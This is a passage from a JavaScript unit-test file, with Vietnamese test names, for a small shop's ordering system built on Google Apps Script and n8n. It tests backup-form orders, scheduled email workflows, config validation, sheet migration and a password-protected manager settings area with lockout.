  assert.equal(env.orderRows().length, 0);
});

test('dự phòng: tham số giả không có hàm không tạo được đơn', () => {
  const env = backupEnv();
  env.gs.onBackupFormSubmit({ response: { id: 'gia' } });
  env.gs.onBackupFormSubmit(undefined);
  assert.equal(env.orderRows().length, 0);
  assert.equal(backupRows(env).length, 0);
});

test('đơn dự phòng lỗi: email một lần dù không có đơn mới, gửi lỗi thì báo lại', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers({ [FIELDS.phone]: '123' }));
  assert.throws(() => runWorkflow(env, () => { throw new Error('SMTP hỏng'); }));
  assert.equal(backupRows(env)[0].notified_at, '');

  const emails = runWorkflow(env, () => {});
  assert.equal(emails.length, 1);
  assert.match(emails[0].subject, /^⚠️ 1 đơn từ form dự phòng chưa nhận được$/);
  assert.doesNotMatch(emails[0].subject, /123/);
  assert.match(emails[0].text, /Số điện thoại: 123/);
  assert.match(emails[0].text, /^Đơn của Khách Form \(123\) chưa vào hệ thống: số điện thoại không đúng/);
  assert.doesNotMatch(emails[0].text, /INVALID_INPUT/);
  assert.ok(backupRows(env)[0].notified_at);
  assert.deepEqual(runWorkflow(env, () => {}), []);
});

test('đơn dự phòng lỗi đi cùng đơn mới: hai email, ack đủ cả hai loại', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers({ [FIELDS.phone]: '123' }));
  env.post(order());
  const emails = runWorkflow(env, () => {});
  assert.equal(emails.length, 2);
  assert.deepEqual(env.pending().orders, []);
  assert.deepEqual(env.pending().backup_errors, []);
});

test('ack đơn dự phòng sai dữ liệu: INVALID_INPUT; không gửi trường này thì phản hồi như đợt 1', () => {
  const env = readyEnv();
  assert.equal(env.ack({ backup_errors: 'x' }).error_code, 'INVALID_INPUT');
  assert.equal(env.ack({ backup_errors: [1] }).error_code, 'INVALID_INPUT');
  assert.deepEqual(env.ack({ codes: [] }), { ok: true, acked: 0 });
  assert.deepEqual(env.ack({ codes: [], backup_errors: ['khong-co'] }), { ok: true, acked: 0, backup_acked: 0 });
});

/* ---------- Đợt 2: workflow và quyền ---------- */

const loadWorkflow = (file) => {
  const wf = JSON.parse(read(`n8n/${file}`));
  const chain = [];
  const trigger = wf.nodes.find((n) => n.type === 'n8n-nodes-base.scheduleTrigger').name;
  for (let name = trigger; name;) {
    chain.push(name);
    name = wf.connections[name]?.main[0][0].node;
  }
  const nodes = Object.fromEntries(wf.nodes.map((n) => [n.name, n]));
  return { wf, chain, nodes, trigger };
};

function runNodeCode(node, input, refs = {}) {
  const fn = new Function('$input', '$', node.parameters.jsCode);
  return fn({ first: () => ({ json: input }) }, (name) => ({ first: () => ({ json: refs[name] }) }));
}

for (const file of ['ops-lists.json', 'daily-report.json']) {
  test(`workflow ${file}: inactive, giờ Việt Nam, có credential, không có secret, email văn bản thuần`, () => {
    const { wf, nodes } = loadWorkflow(file);
    assert.equal(wf.active, false);
    assert.equal(wf.settings.timezone, 'Asia/Ho_Chi_Minh');
    assert.equal(nodes['Gửi email'].parameters.emailFormat, 'text');
    assert.ok(nodes['Gửi email'].credentials.smtp);
    const http = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest');
    assert.ok(http.length > 0);
    http.forEach((n) => {
      assert.ok(n.credentials.httpQueryAuth);
      assert.equal(n.parameters.options.timeout, 20000);
    });
    assert.ok(!JSON.stringify(wf).includes('key='));
    assert.ok(!fs.existsSync(path.join(root, `../n8n-mvp/workflows/${file}`)));
  });
}

test('workflow danh sách: mỗi 30 phút từ 8h đến đúng 21h, gửi rồi mới xác nhận', () => {
  const { chain, nodes, trigger } = loadWorkflow('ops-lists.json');
  assert.deepEqual(chain.slice(1), ['Cấu hình', 'Lấy danh sách', 'Soạn email', 'Gửi email', 'Xác nhận đã gửi', 'Kiểm tra xác nhận']);
  const rules = nodes[trigger].parameters.rule.interval.map((r) => r.expression);
  assert.deepEqual(rules, ['0,30 8-20 * * *', '0 21 * * *']);
  assert.equal(nodes['Lấy danh sách'].parameters.queryParameters.parameters[0].value, 'ops_lists');
  assert.equal(nodes['Xác nhận đã gửi'].parameters.queryParameters.parameters[0].value, 'ops_lists_ack');
});

test('chạy workflow danh sách: nhân viên đánh dấu da_nhan thì lần sau đơn vào danh sách pha chế', () => {
  const { nodes } = loadWorkflow('ops-lists.json');
  const env = readyEnv();
  const runLists = (send) => {
    const items = runNodeCode(nodes['Soạn email'], lists(env), { 'Cấu hình': CFG });
    items.forEach((item) => send(item.json));
    if (items.length) {
      const ack = env.post(items[0].json.ack, { action: 'ops_lists_ack', key: N8N_KEY });
      runNodeCode(nodes['Kiểm tra xác nhận'], ack);
    }
    return items.map((item) => item.json);
  };

  assert.deepEqual(runLists(() => {}), [], 'chưa có gì thì không gửi');
  const transfer = env.staff(order({ payment_method: 'chuyen_khoan', name: 'Khách Chuyển' }));
  const [heldEmail] = runLists(() => {});
  assert.match(heldEmail.subject, /^📋 Cần chuẩn bị 0 phần · giao 0 điểm · 1 đơn đang chờ$/);
  assert.match(heldEmail.text, /chờ chuyển khoản/);

  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === transfer.order_code, 'payment_status', 'da_nhan');
  assert.throws(() => runLists(() => { throw new Error('SMTP hỏng'); }));
  const [prepEmail] = runLists(() => {});
  assert.match(prepEmail.subject, /^📋 Cần chuẩn bị 2 phần · giao 0 điểm$/);
  assert.doesNotMatch(prepEmail.subject, /Khách Chuyển/);
  assert.match(prepEmail.text, new RegExp(`- 2 phần: Trà sữa truyền thống \\(mẫu\\) \\(${transfer.order_code}\\)`));

  env.setOrderStatus(transfer.order_code, 'dang_giao');
  const [email] = runLists(() => {});
  assert.match(email.subject, /^📋 Cần chuẩn bị 0 phần · giao 1 điểm$/);
  assert.match(email.text, /Thu: 0đ/);
  assert.match(email.text, /Khách Chuyển/);
  assert.match(email.text, /google\.com\/maps\/dir/);
  assert.equal(email.to, CFG.notify_to);
  assert.deepEqual(runLists(() => {}), [], 'không đổi thì không gửi lại');
  assert.throws(() => runNodeCode(nodes['Soạn email'], { ok: false, error_code: 'UNAUTHORIZED' }, { 'Cấu hình': CFG }), /UNAUTHORIZED/);
  assert.throws(() => runNodeCode(nodes['Kiểm tra xác nhận'], { ok: false, error_code: 'SERVER_ERROR' }), /SERVER_ERROR/);
});

test('workflow báo cáo: 22h mỗi ngày, gửi đúng nội dung từ Apps Script', () => {
  const { chain, nodes, trigger } = loadWorkflow('daily-report.json');
  assert.deepEqual(chain.slice(1), ['Cấu hình', 'Lấy báo cáo', 'Soạn email', 'Gửi email']);
  assert.deepEqual(nodes[trigger].parameters.rule.interval.map((r) => r.expression), ['0 22 * * *']);
  const env = readyEnv();
  env.post(order({ name: 'Khách riêng tư' }));
  const data = report(env);
  const [item] = runNodeCode(nodes['Soạn email'], data, { 'Cấu hình': CFG });
  assert.equal(item.json.text, data.text);
  assert.equal(item.json.subject, '📊 Hôm nay: 2 phần · 0đ');
  assert.ok(!JSON.stringify(data).includes('Khách riêng tư'), 'báo cáo không có dữ liệu khách');
  assert.throws(() => runNodeCode(nodes['Soạn email'], { ok: false, error_code: 'UNAUTHORIZED' }, { 'Cấu hình': CFG }), /UNAUTHORIZED/);
});

test('quyền: khai báo Form và trigger, Sheets vẫn chỉ trong file hiện tại, bỏ @OnlyCurrentDoc', () => {
  const manifest = JSON.parse(read('apps-script/appsscript.json'));
  assert.deepEqual([...manifest.oauthScopes].sort(), [
    'https://www.googleapis.com/auth/forms',
    'https://www.googleapis.com/auth/script.scriptapp',
    'https://www.googleapis.com/auth/spreadsheets.currentonly',
  ]);
  assert.ok(!read('apps-script/Code.gs').includes('@OnlyCurrentDoc'));
});

/* ---------- Cấu hình an toàn ---------- */

/** Một lần chạy order-notify, trả các email đã gửi. */
const emailsOf = (env) => runWorkflow(env, () => {});

test('Cấu hình: ô số trống khi đã có bản hợp lệ thì vẫn nhận đơn với giá trị cũ, email cảnh báo một lần nêu tên ô', () => {
  const env = readyEnv();
  assert.equal(env.post(order()).ok, true);
  emailsOf(env);

  env.setConfig('shipping_fee_den_10km', '');
  const kept = env.post(order());
  assert.equal(kept.ok, true);
  assert.equal(kept.shipping_fee, 10000);
  assert.equal(kept.total, 108000);
  assert.equal(env.getJson().shipping_fees.den_10km, 10000, 'landing cũng dùng giá trị cũ');

  const emails = emailsOf(env);
  const alert = emails.find((e) => e.subject === '⚠️ Tab Cấu hình đang có ô sai');
  assert.ok(alert, 'có email cảnh báo');
  assert.equal(alert.text, 'Ô "Phí ship đến 10km" đang trống. Hệ thống tạm dùng giá trị cũ: 10.000đ.\nVẫn nhận đơn bình thường.');
  assert.ok(emails.some((e) => /đơn mới/.test(e.subject)), 'đơn mới vẫn được báo cùng lần');

  assert.deepEqual(emailsOf(env), [], 'lần chạy sau không gửi lại cùng lỗi');
  env.post(order());
  assert.ok(emailsOf(env).every((e) => !/Cấu hình/.test(e.subject)), 'có đơn mới vẫn không báo lại lỗi cũ');
});

test('Cấu hình: chưa từng hợp lệ thì từ chối đơn, SERVER_ERROR, không lưu bản hợp lệ', () => {
  const env = readyEnv();
  env.setConfig('shipping_fee_den_10km', '');
  assert.equal(env.post(order()).error_code, 'SERVER_ERROR');
  assert.equal(env.staff(order()).error_code, 'SERVER_ERROR');
  assert.equal(env.pending().error_code, 'SERVER_ERROR');
  assert.equal(env.orderRows().length, 0);
  assert.equal(env.props.has('CONFIG_LAST_GOOD'), false);
});

test('Cấu hình: sửa xong thì dùng giá trị mới và xoá cảnh báo; lỗi khác sau đó lại được báo', () => {
  const env = readyEnv();
  env.getJson();
  env.setConfig('max_cups', 'rất nhiều');
  assert.equal(env.post(order()).ok, true);
  assert.equal(emailsOf(env).filter((e) => /Cấu hình/.test(e.subject)).length, 1);
  assert.match(env.props.get('CONFIG_ALERTED'), /max_cups/);

  env.setConfig('max_cups', 3);
  assert.equal(env.post(order()).error_code, 'SOLD_OUT', 'giá trị mới có hiệu lực ngay');
  assert.equal(env.props.has('CONFIG_ALERTED'), false, 'cảnh báo được xoá');
  emailsOf(env);

  env.setConfig('call_threshold_cups', '');
  const emails = emailsOf(env);
  assert.equal(emails.length, 1);
  assert.match(emails[0].text, /^Ô "Ngưỡng đơn lớn cần gọi" đang trống\. Hệ thống tạm dùng giá trị cũ: 5 phần\./);

  // Cùng ô hỏng lại sau khi đã sửa: báo lại.
  env.setConfig('call_threshold_cups', 5);
  env.getJson();
  env.setConfig('call_threshold_cups', '');
  assert.equal(emailsOf(env).length, 1);
});

test('Cấu hình: giới hạn phần phải từ 1, số âm và chữ bị coi là sai', () => {
  const env = readyEnv();
  env.getJson();
  for (const [key, value] of [['max_cups', 0], ['max_cups_per_phone_public', 0], ['low_stock_alert_cups', -1], ['shipping_fee_tu_lay', 'năm nghìn']]) {
    env.setConfig(key, value);
    assert.equal(env.post(order(cups(1))).ok, true, key);
    assert.ok(env.pending().config_alert.messages.some((m) => m.includes('giá trị cũ')), key);
    env.setConfig(key, plain(env.gs.SEED_CONFIG.find((e) => e[0] === key)[1]));
  }
});

test('Cấu hình: gửi email cảnh báo lỗi thì chưa đánh dấu, lần sau gửi lại', () => {
  const env = readyEnv();
  env.getJson();
  env.setConfig('shipping_fee_trong_2km', '');
  assert.throws(() => runWorkflow(env, () => { throw new Error('SMTP hỏng'); }));
  assert.equal(env.props.has('CONFIG_ALERTED'), false);
  assert.equal(emailsOf(env).length, 1);
  assert.equal(env.ack({ codes: [], config_alert: 1 }).error_code, 'INVALID_INPUT');
});

test('Nhận đơn: Mở cửa/Đóng cửa, TRUE/FALSE cũ vẫn đọc được, giá trị lạ là Đóng cửa ở mọi kênh', () => {
  const env = readyEnv();
  for (const [value, open] of [['Mở cửa', true], ['Đóng cửa', false], [true, true], [false, false], ['TRUE', true], ['FALSE', false], ['mở', false], ['', false]]) {
    env.setConfig('orders_open', value);
    assert.equal(env.getJson().orders_open, open, String(value));
    const staff = env.staff(order(cups(1)));
    const landing = env.post(order(cups(1)));
    if (open) {
      assert.equal(staff.ok, true, String(value));
      assert.equal(landing.ok, true, String(value));
    } else {
      assert.equal(staff.error_code, 'SOLD_OUT', String(value));
      assert.equal(staff.message, 'Đang đóng cửa, chưa nhận đơn.');
      assert.equal(landing.error_code, 'SOLD_OUT', String(value));
      assert.equal(plain(env.gs.staffStatus(STAFF_KEY)).orders_open, false);
    }
  }
});

test('Hết suất ở trang nhập đơn nói rõ số phần còn lại; landing không lộ số này', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 3);
  env.setConfig('unit_label', 'hộp');
  env.post(order(cups(2)));
  assert.equal(env.staff(order(cups(2))).message, 'Hết suất. Còn 1 hộp trong đợt này.');
  assert.doesNotMatch(env.post(order(cups(2))).message, /\d/);
});

test('Đơn vị: unit_label = hộp thì email, danh sách, báo cáo và trạng thái dùng hộp; trống thì phần', () => {
  const env = readyEnv();
  env.setConfig('unit_label', 'hộp');
  env.setConfig('low_stock_alert_cups', 2);
  env.post(order());
  const emails = emailsOf(env);
  assert.ok(emails.some((e) => e.subject === '🔔 1 đơn mới · 2 hộp'));
  assert.ok(emails.some((e) => e.subject === '⚠️ Còn 598 hộp cuối'));
  const current = lists(env);
  assert.equal(current.subject, '📋 Cần chuẩn bị 2 hộp · giao 0 điểm');
  assert.match(current.text, /^CHUẨN BỊ · 2 hộp\n- 2 hộp: /);
  assert.match(report(env).subject, /^📊 Hôm nay: 2 hộp · /);
  assert.equal(plain(env.gs.staffStatus(STAFF_KEY)).unit_label, 'hộp');
  assert.match(env.get({ page: 'staff', key: STAFF_KEY }).content, /"unit_label":"hộp"/);

  env.setConfig('unit_label', '');
  assert.equal(lists(env).subject, '📋 Cần chuẩn bị 2 phần · giao 0 điểm');
  for (const text of [lists(env).text, report(env).text, report(env).subject]) assert.doesNotMatch(text, /cốc|pha chế/i);
});

test('Trang nhập đơn: dải trạng thái có mở hay đóng, số phần còn lại, số đơn chờ; chỉ khi đúng khoá', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 10);
  env.setConfig('low_stock_alert_cups', 4);
  env.post(order(cups(3)));
  env.staff(order({ payment_method: 'chuyen_khoan', ...cups(1) }));
  const status = plain(env.gs.staffStatus(STAFF_KEY));
  assert.deepEqual(status, { ok: true, orders_open: true, remaining_cups: 6, low_stock: true, held_count: 1, unit_label: 'phần' });

  const html = env.get({ page: 'staff', key: STAFF_KEY }).content;
  assert.match(html, /var STATUS = \{"orders_open":true,"remaining_cups":6,"low_stock":true,"held_count":1,"unit_label":"phần"\}/);
  assert.equal(plain(env.gs.staffOpsLists(STAFF_KEY)).status.held_count, 1);

  for (const key of ['sai', '', undefined, N8N_KEY]) {
    assert.equal(plain(env.gs.staffStatus(key)).error_code, 'UNAUTHORIZED');
    const denied = env.get({ page: 'staff', key }).content;
    assert.ok(denied.includes('Link này không còn dùng được. Hỏi quản lý link mới.'));
    assert.ok(!denied.includes('remaining_cups'));
  }
  const publicConfig = env.getJson();
  assert.equal(publicConfig.remaining_cups, undefined);
  assert.equal(publicConfig.unit_label, undefined, 'hợp đồng landing giữ nguyên');
});

test('Trang nhập đơn: theme sáng cố định, không theo chế độ tối của máy, không thư viện JS ngoài', () => {
  const html = read('apps-script/Staff.html');
  assert.match(html, /color-scheme: light/);
  assert.doesNotMatch(html, /prefers-color-scheme/);
  assert.doesNotMatch(html, /<script[^>]+src=/);
  for (const id of ['open-badge', 'remaining', 'held-link', 'tab-entry', 'tab-lists', 'view-held', 'refresh', 'next-order', 'total-sub']) {
    assert.match(html, new RegExp(`id="${id}"`), id);
  }
  assert.doesNotMatch(html, /pha chế|cốc/i);
});

/** Đưa Sheet về đúng trạng thái đợt trước: TRUE/FALSE, câu ý nghĩa cũ, cột Cốc, chưa có unit_label và cột Lý do gọi. */
function previousRoundEnv(openValue) {
  const env = readyEnv();
  const config = env.sheets.get('Cấu hình');
  const keyColumn = env.columnOf('Cấu hình', 'key');
  config.cells = config.cells.filter((row) => row[keyColumn - 1] !== 'unit_label');
  env.setConfig('orders_open', openValue);
  for (const [key, meaning] of Object.entries(env.gs.OLD_CONFIG_MEANINGS)) {
    env.setCell('Cấu hình', (h) => (row) => row[h.indexOf('key')] === key, 'ghi_chu', meaning);
  }
  config.validations = {};
  config.colorRules = [];
  const orders = env.sheets.get('Đơn hàng');
  const reasonColumn = orders.cells[0].indexOf('Lý do gọi');
  orders.cells.forEach((row) => row.splice(reasonColumn, 1));
  orders.store(1, env.columnOf('Đơn hàng', 'cups'), 'Cốc');
  return env;
}

test('Sheet đợt trước: setup đổi Nhận đơn sang Mở cửa/Đóng cửa, thêm unit_label và cột Lý do gọi, không mất đơn hay giá trị đã sửa', () => {
  for (const [old, label] of [[true, 'Mở cửa'], [false, 'Đóng cửa'], ['TRUE', 'Mở cửa'], ['bật', 'Đóng cửa']]) {
    const env = previousRoundEnv(old);
    env.setConfig('orders_open', true);
    const created = env.post(order({ name: 'Khách cũ', ...cups(5) }));
    assert.equal(created.ok, true, 'bản code mới chạy được trước setup');
    assert.equal(env.orderRows()[0].cups, 5);
    env.setConfig('orders_open', old);
    env.setConfig('max_cups', 123);
    env.setCell('Cấu hình', (h) => (row) => row[h.indexOf('key')] === 'max_cups', 'ghi_chu', 'Nhóm tự sửa');

    env.setup();

    const rows = env.configRows();
    assert.equal(rows.find((r) => r.key === 'orders_open').value, label, String(old));
    assert.equal(rows.find((r) => r.key === 'unit_label').value, 'phần');
    assert.equal(rows.find((r) => r.key === 'max_cups').value, 123);
    assert.equal(rows.find((r) => r.key === 'max_cups').ghi_chu, 'Nhóm tự sửa', 'câu nhóm sửa được giữ');
    assert.match(rows.find((r) => r.key === 'orders_open').ghi_chu, /Chọn Đóng cửa để tạm dừng mọi kênh đặt hàng/);
    assert.match(rows.find((r) => r.key === 'call_threshold_cups').ghi_chu, /số phần này/);
    assert.ok(rows.every((r) => !/cốc/.test(r.ghi_chu)), 'không còn chữ cốc trong ý nghĩa');
    assert.equal(new Set(rows.map((r) => r.key)).size, rows.length);

    assert.equal(env.orderRows().length, 1);
    assert.equal(env.orderRows()[0].name, 'Khách cũ');
    assert.equal(env.orderRows()[0].cups, 5);
    assert.ok(headerRow(env, 'Đơn hàng').includes('Lý do gọi'));
    assert.ok(headerRow(env, 'Đơn hàng').includes('Số lượng'));
    assert.ok(!headerRow(env, 'Đơn hàng').includes('Cốc'));
    assert.equal(env.getJson().orders_open, label === 'Mở cửa');

    // Đơn tạo trước khi có cột lý do vẫn hiện cần gọi, đơn mới có lý do.
    env.setConfig('orders_open', 'Mở cửa');
    const after = env.staff(order(cups(5)));
    assert.equal(env.orderRows().find((r) => r.order_code === after.order_code).call_reason, 'đơn lớn, trả tiền mặt');
    assert.equal(env.pending().orders[0].needs_call, true);

    const before = plain(env.sheets.get('Cấu hình').cells);
    env.setup();
    assert.deepEqual(plain(env.sheets.get('Cấu hình').cells), before, 'chạy lại không đổi gì');
  }
});

test('setup: ô Nhận đơn là ô chọn Mở cửa/Đóng cửa có màu; ô số chặn chữ và số âm, giới hạn phần từ 1', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Cấu hình');
  const rows = env.configRows();
  const cell = (key) => `${rows.findIndex((r) => r.key === key) + 2},${env.columnOf('Cấu hình', 'value')}`;
  assert.deepEqual(plain(sheet.validations[cell('orders_open')]), { values: ['Mở cửa', 'Đóng cửa'], allowInvalid: false });
  const formulaFor = (key) => {
    const [row, column] = cell(key).split(',').map(Number);
    const ref = `${String.fromCharCode(64 + column)}${row}`;
    return (min) => `=INT(${ref})=${ref}+(${ref}<${min})`;
  };
  for (const key of ['max_cups', 'max_cups_per_phone_public', 'call_threshold_cups']) {
    assert.equal(sheet.validations[cell(key)].formula, formulaFor(key)(1), key);
  }
  for (const key of ['low_stock_alert_cups', 'shipping_fee_tu_lay', 'shipping_fee_trong_2km', 'shipping_fee_den_10km', 'maps_max_stops']) {
    assert.equal(sheet.validations[cell(key)].formula, formulaFor(key)(0), key);
    assert.equal(sheet.validations[cell(key)].allowInvalid, false, key);
  }
  for (const key of ['unit_label', 'bank_account', 'shop_address']) assert.equal(sheet.validations[cell(key)], undefined, key);
  assert.deepEqual(plain(sheet.colorRules.map((r) => [r.text, r.color])), [['Mở cửa', '#E3F4E1'], ['Đóng cửa', '#FDE4E1']]);
  env.setup();
  assert.equal(sheet.colorRules.length, 2, 'chạy lại không nhân đôi');
});

test('công thức kiểm tra số: chỉ đúng với số nguyên từ mức tối thiểu, không có dấu ngăn đối số', () => {
  // Tính công thức như Sheets: INT(x) = x + (x < min).
  const holds = (x, min) => Math.floor(x) === x + (x < min ? 1 : 0);
  for (const min of [0, 1]) {
    for (const [x, ok] of [[min, true], [min + 5, true], [10000, true], [1.5, false], [min - 1, false], [-3, false], [0.5, false]]) {
      assert.equal(holds(x, min), ok, `x=${x} min=${min}`);
    }
  }
});

test('Form dự phòng cũ có câu hỏi Số cốc: setupBackupForm đổi tên tại chỗ, không thêm câu hỏi trùng', () => {
  const env = backupEnv();
  const form = [...env.forms.values()][0];
  form.items.find((i) => i.title === 'Số lượng').setTitle('Số cốc');
  const count = form.items.length;
  env.gs.setupBackupForm();
  assert.equal(form.items.length, count);
  assert.ok(form.items.some((i) => i.title === 'Số lượng'));
  assert.ok(!form.items.some((i) => i.title === 'Số cốc'));
  assert.doesNotMatch(form.description, /cốc/);
  // Phản hồi gửi theo tiêu đề cũ vẫn đọc được.
  const payload = env.gs.backupPayload({ ...backupAnswers(), 'Số cốc': '3', 'Số lượng': undefined }, 'cu', env.gs.readCatalog_());
  assert.equal(payload.items[0].quantity, 3);
});

/* ---------- Mục Cài đặt có mật khẩu quản lý ---------- */

const MANAGER_PASSWORD = 'mat-khau-quan-ly';

function managerEnv() {
  const env = readyEnv();
  env.props.set('MANAGER_PASSWORD', MANAGER_PASSWORD);
  env.open = (...args) => plain(env.gs.managerSettings(args.length > 1 ? args[1] : STAFF_KEY, args.length ? args[0] : MANAGER_PASSWORD));
  env.save = (change, ...args) => plain(env.gs.managerSave(args.length > 1 ? args[1] : STAFF_KEY, args.length ? args[0] : MANAGER_PASSWORD, change));
  env.configValue = (key) => env.configRows().find((r) => r.key === key).value;
  return env;
}

test('Cài đặt: mật khẩu đúng thì thấy giá trị hiện tại, không có mật khẩu trong phản hồi', () => {
  const env = managerEnv();
  env.setConfig('max_cups', 321);
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-matcha', 'status', 'inactive');
  const result = env.open();
  assert.equal(result.ok, true);
  assert.equal(result.settings.orders_open, true);
  assert.equal(result.settings.unit_label, 'phần');
  assert.deepEqual(result.settings.fields, {
    max_cups: '321', low_stock_alert_cups: '550', max_cups_per_phone_public: '10', call_threshold_cups: '5',
    shipping_fee_tu_lay: '0', shipping_fee_trong_2km: '0', shipping_fee_den_10km: '10000',
  });
  assert.deepEqual(result.settings.products.map((p) => [p.product_id, p.active]), [['tra-sua-truyen-thong', true], ['tra-sua-matcha', false]]);
  const raw = JSON.stringify(result);
  for (const secret of [MANAGER_PASSWORD, STAFF_KEY, N8N_KEY, 'bank_account']) assert.ok(!raw.includes(secret), secret);
});

test('Cài đặt: sai mật khẩu thì "Mật khẩu chưa đúng." và không lộ cài đặt; sai khoá trang thì không tính lần sai', () => {
  const env = managerEnv();
  for (const password of ['sai', '', undefined, STAFF_KEY]) {
    const result = env.open(password);
    assert.equal(result.error_code, 'UNAUTHORIZED', String(password));
    assert.equal(result.message, 'Mật khẩu chưa đúng.');
    assert.equal(result.settings, undefined);
  }
  env.props.delete('MANAGER_FAILS');
  for (const key of ['sai', '', undefined, N8N_KEY]) {
    const result = env.open(MANAGER_PASSWORD, key);
    assert.equal(result.error_code, 'UNAUTHORIZED');
    assert.equal(result.settings, undefined);
  }
  assert.equal(env.props.has('MANAGER_FAILS'), false);
  assert.equal(env.open().ok, true);
});

test('Cài đặt: sai 5 lần thì khoá 10 phút cho mọi người, kể cả mật khẩu đúng; hết 10 phút thì mở lại', () => {
  const env = managerEnv();
  let now = Date.parse('2026-11-04T11:00:00+07:00');
  env.gs.nowMs_ = () => now;
  for (let i = 0; i < 4; i++) assert.equal(env.open('sai').message, 'Mật khẩu chưa đúng.');
  const fifth = env.open('sai');
  assert.equal(fifth.error_code, 'LOCKED');
  assert.equal(fifth.message, 'Nhập sai quá nhiều lần, thử lại sau 10 phút.');
  assert.equal(env.open().error_code, 'LOCKED', 'mật khẩu đúng cũng bị khoá');
  assert.equal(env.save({ field: 'orders_open', open: false }).error_code, 'LOCKED');
  assert.equal(env.configValue('orders_open'), 'Mở cửa', 'không ghi khi bị khoá');

  now += 10 * 60 * 1000 - 1;
  assert.equal(env.open().error_code, 'LOCKED');
  now += 1;
  assert.equal(env.open().ok, true, 'hết 10 phút thì mở lại');
  assert.equal(env.open('sai').message, 'Mật khẩu chưa đúng.', 'đếm lại từ đầu');
  assert.equal(env.open().ok, true);
  assert.equal(env.props.has('MANAGER_FAILS'), false, 'nhập đúng thì xoá số lần sai');
  assert.equal(env.lockHeld, false);
});

test('Cài đặt: chưa đặt MANAGER_PASSWORD thì luôn từ chối và báo cần đặt trong Apps Script', () => {
  const env = readyEnv();
  for (const password of ['', undefined, 'bat-ky']) {
    const result = plain(env.gs.managerSettings(STAFF_KEY, password));
    assert.equal(result.error_code, 'NOT_CONFIGURED');
    assert.match(result.message, /MANAGER_PASSWORD.*Apps Script/);
    assert.equal(result.settings, undefined);
    assert.equal(plain(env.gs.managerSave(STAFF_KEY, password, { field: 'orders_open', open: false })).error_code, 'NOT_CONFIGURED');
  }
  assert.equal(env.configRows().find((r) => r.key === 'orders_open').value, 'Mở cửa');
});

test('Cài đặt: Đóng cửa ghi vào Cấu hình, trả trạng thái mới cho dải, mọi kênh từ chối; Mở cửa lại thì nhận', () => {
  const env = managerEnv();
  const closed = env.save({ field: 'orders_open', open: false });
  assert.equal(closed.ok, true);
  assert.equal(env.configValue('orders_open'), 'Đóng cửa');
  assert.equal(closed.status.orders_open, false);
  assert.equal(closed.settings.orders_open, false);
  assert.equal(env.post(order()).error_code, 'SOLD_OUT');
  assert.equal(env.staff(order()).error_code, 'SOLD_OUT');
  assert.equal(env.lockHeld, false);

  assert.equal(env.save({ field: 'orders_open', open: true }).status.orders_open, true);
  assert.equal(env.configValue('orders_open'), 'Mở cửa');
  assert.equal(env.post(order()).ok, true);
  assert.equal(env.save({ field: 'orders_open', open: 'Đóng cửa' }).field, 'orders_open');
});

test('Cài đặt: số sai thì không ghi và báo đúng ô; số đúng ghi dạng số và có hiệu lực ngay', () => {
  const env = managerEnv();
  const cases = [
    ['max_cups', '0', /từ 1 trở lên/],
    ['max_cups', 'nhiều', /từ 1 trở lên/],
    ['max_cups_per_phone_public', 0, /từ 1 trở lên/],
    ['low_stock_alert_cups', '-1', /từ 0 trở lên/],
    ['call_threshold_cups', '1.5', /từ 1 trở lên/],
    ['call_threshold_cups', '0', /từ 1 trở lên/],
    ['shipping_fee_den_10km', '10', /thiếu số 0/],
    ['shipping_fee_trong_2km', '', /Nhập một số/],
  ];
  for (const [field, value, message] of cases) {
    const before = env.configValue(field);
    const result = env.save({ field, value });
    assert.equal(result.error_code, 'INVALID_INPUT', `${field}=${value}`);
    assert.equal(result.field, field);
    assert.match(result.message, message);
    assert.equal(env.configValue(field), before, 'không ghi');
  }
  const saved = env.save({ field: 'max_cups', value: ' 700 ' });
  assert.equal(saved.ok, true);
  assert.equal(env.configValue('max_cups'), 700);
  assert.equal(saved.settings.fields.max_cups, '700');
  assert.equal(saved.status.remaining_cups, 700);
  assert.equal(env.save({ field: 'shipping_fee_den_10km', value: '15000' }).ok, true);
  assert.equal(env.post(order()).shipping_fee, 15000);
  assert.equal(env.save({ field: 'low_stock_alert_cups', value: '0' }).ok, true);
  assert.equal(env.configValue('low_stock_alert_cups'), 0);
});

test('Cài đặt: tắt món thì tab Món ghi inactive và món biến khỏi menu; bật lại thì bán lại', () => {
  const env = managerEnv();
  const off = env.save({ field: 'product', product_id: 'tra-sua-matcha', active: false });
  assert.equal(off.ok, true);
  const status = (id) => {
    const values = env.sheets.get('Món').getDataRange().getValues();
    const keys = env.gs.headerKeys_('Món', values[0]);
    return values.find((row) => row[keys.indexOf('product_id')] === id)[keys.indexOf('status')];
  };
  assert.equal(status('tra-sua-matcha'), 'inactive');
  assert.deepEqual(env.getJson().products.map((p) => p.product_id), ['tra-sua-truyen-thong']);
  assert.equal(off.settings.products.find((p) => p.product_id === 'tra-sua-matcha').active, false);
  assert.equal(env.post(order({ items: [{ product_id: 'tra-sua-matcha', quantity: 1, toppings: [] }] })).error_code, 'INVALID_INPUT');

  assert.equal(env.save({ field: 'product', product_id: 'tra-sua-matcha', active: true }).ok, true);
  assert.equal(status('tra-sua-matcha'), 'active');
  assert.equal(env.getJson().products.length, 2);
  assert.equal(env.save({ field: 'product', product_id: 'khong-co', active: false }).field, 'product');
});

test('Cài đặt: gọi thẳng hàm lưu không có mật khẩu đúng thì UNAUTHORIZED, không ghi; ô ngoài danh sách không sửa được', () => {
  const env = managerEnv();
  const changes = [
    { field: 'orders_open', open: false },
    { field: 'max_cups', value: '1' },
    { field: 'product', product_id: 'tra-sua-matcha', active: false },
  ];
  for (const change of changes) {
    for (const password of [undefined, '', 'sai']) {
      env.props.delete('MANAGER_FAILS');
      assert.equal(env.save(change, password).error_code, 'UNAUTHORIZED');
    }
    assert.equal(env.save(change, MANAGER_PASSWORD, 'sai').error_code, 'UNAUTHORIZED');
  }
  assert.equal(env.configValue('orders_open'), 'Mở cửa');
  assert.equal(env.configValue('max_cups'), 600);
  assert.equal(env.getJson().products.length, 2);

  for (const change of [
    { field: 'bank_account', value: '123' }, { field: 'shop_address', value: 'x' }, { field: 'unit_label', value: 'hộp' },
